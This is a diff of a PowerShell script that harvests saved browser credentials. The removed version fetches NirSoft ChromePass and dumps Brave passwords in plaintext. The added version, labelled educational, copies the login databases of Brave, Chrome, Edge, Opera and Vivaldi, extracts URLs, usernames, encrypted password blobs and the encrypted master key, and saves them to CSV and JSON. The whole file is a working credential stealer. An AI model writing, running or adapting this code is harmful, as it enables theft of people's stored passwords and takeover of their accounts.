@@ -1,30 +1,163 @@
-# Download and run NirSoft ChromePass for immediate password extraction
-$tempDir = "$env:TEMP\ChromePass"
-$chromePassUrl = "https://www.nirsoft.net/toolsdownload/chromepass.zip"
-$outputFile = ".\BravePasswords.csv"
+# ================================================
+# Multi-Browser Encrypted Password Extraction Tool
+# For Educational / CTF / Cybersecurity Assignments
+# ================================================
 
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+param(
+    [string]$OutputDir = ".\BrowserEncryptedData"
+)
 
-try {
-    Write-Host "Downloading NirSoft ChromePass..." -ForegroundColor Yellow
-    $zipPath = "$tempDir\chromepass.zip"
-    Invoke-WebRequest -Uri $chromePassUrl -OutFile $zipPath -UseBasicParsing
-    
-    Write-Host "Extracting ChromePass..." -ForegroundColor Yellow
-    Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
-    
-    if (Test-Path "$tempDir\ChromePass.exe") {
-        Write-Host "Extracting Brave passwords..." -ForegroundColor Green
-        & "$tempDir\ChromePass.exe" /scomma $outputFile
-        
-        if (Test-Path $outputFile) {
-            $passwords = Import-Csv $outputFile
-            Write-Host "Successfully extracted $($passwords.Count) passwords!" -ForegroundColor Green
-            $passwords | Select-Object -First 10 | Format-Table -AutoSize
-        }
-    }
-} catch {
-    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
-} finally {
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+Write-Host "Multi-Browser Password Extraction Tool" -ForegroundColor Green
+Write-Host "======================================" -ForegroundColor Green
+
+# Ensure output directory
+if (-not (Test-Path $OutputDir)) {
+    New-Item -ItemType Directory -Path $OutputDir | Out-Null
 }
+
+# ----------------------------------------
+# List of Chromium-based browsers
+# ----------------------------------------
+$browsers = @(
+    @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
+    @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
+    @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
+    @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable" },  # Opera has slight variation
+    @{ Name = "Vivaldi"; Path = "$env:LOCALAPPDATA\Vivaldi\User Data" }
+)
+
+# ----------------------------------------
+# Function: Install SQLite3 if needed
+# ----------------------------------------
+function Install-SQLiteIfNeeded {
+    if (Test-Path ".\sqlite3.exe") { return $true }
+    try {
+        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
+        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
+        $tempZip = "sqlite-temp.zip"
+        
+        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
+        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
+        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
+        
+        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
+        
+        Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "Failed to download SQLite3: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# ----------------------------------------
+# Function: Extract Encrypted Passwords (Generic Chromium)
+# ----------------------------------------
+function Get-ChromiumEncryptedPasswords {
+    param(
+        [string]$BrowserName,
+        [string]$UserDataPath
+    )
+
+    $loginDataPath = Join-Path $UserDataPath "Default\Login Data"
+    $localStatePath = Join-Path $UserDataPath "Local State"
+
+    if (-not (Test-Path $loginDataPath)) {
+        Write-Host "$BrowserName login database not found." -ForegroundColor Yellow
+        return $null
+    }
+
+    Write-Host "[$BrowserName] Extracting login database..." -ForegroundColor Cyan
+
+    # Master key info
+    $masterKeyInfo = $null
+    if (Test-Path $localStatePath) {
+        try {
+            $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
+            $encryptedKey = $localStateContent.os_crypt.encrypted_key
+            $masterKeyInfo = @{
+                EncryptedKey = $encryptedKey
+                KeyLength = ([System.Convert]::FromBase64String($encryptedKey)).Length
+                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            }
+        } catch { }
+    }
+
+    $results = @()
+
+    try {
+        $tempDbPath = "$BrowserName-temp.db"
+        Copy-Item $loginDataPath $tempDbPath -Force
+
+        $query = @"
+SELECT 
+    origin_url, 
+    username_value, 
+    hex(password_value) as password_hex,
+    length(password_value) as password_length
+FROM logins;
+"@
+
+        $tempCsvPath = "$BrowserName-temp.csv"
+        & ".\sqlite3.exe" -csv -header $tempDbPath $query > $tempCsvPath
+
+        if (Test-Path $tempCsvPath) {
+            $logins = Import-Csv $tempCsvPath
+            foreach ($login in $logins) {
+                $results += [PSCustomObject]@{
+                    Browser = $BrowserName
+                    URL = $login.origin_url
+                    Username = $login.username_value
+                    HexData = $login.password_hex
+                    DataLength = $login.password_length
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+            }
+            Remove-Item $tempCsvPath -Force
+        }
+
+        Remove-Item $tempDbPath -Force
+    } catch {
+        Write-Host "[$BrowserName] Error: $($_.Exception.Message)" -ForegroundColor Red
+    }
+
+    return @{
+        Browser = $BrowserName
+        MasterKey = $masterKeyInfo
+        Entries = $results
+    }
+}
+
+# ----------------------------------------
+# Main Execution
+# ----------------------------------------
+if (-not (Install-SQLiteIfNeeded)) {
+    Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
+    exit 1
+}
+
+foreach ($browser in $browsers) {
+    $name = $browser.Name
+    $path = $browser.Path
+
+    if (Test-Path $path) {
+        $result = Get-ChromiumEncryptedPasswords -BrowserName $name -UserDataPath $path
+        if ($result -ne $null) {
+            $csvOut = Join-Path $OutputDir "$name-Passwords.csv"
+            $jsonOut = Join-Path $OutputDir "$name-Passwords.json"
+
+            try {
+                $result.Entries | Export-Csv -Path $csvOut -NoTypeInformation -Encoding UTF8 -Force
+                $result | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonOut -Encoding UTF8
+                Write-Host "[$name] Exported to $csvOut and $jsonOut" -ForegroundColor Green
+            } catch {
+                Write-Host "[$name] Export failed: $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+    } else {
+        Write-Host "[$name] Not installed on this system." -ForegroundColor DarkGray
+    }
+}
+
+Write-Host "`nAll browser extractions completed." -ForegroundColor Green
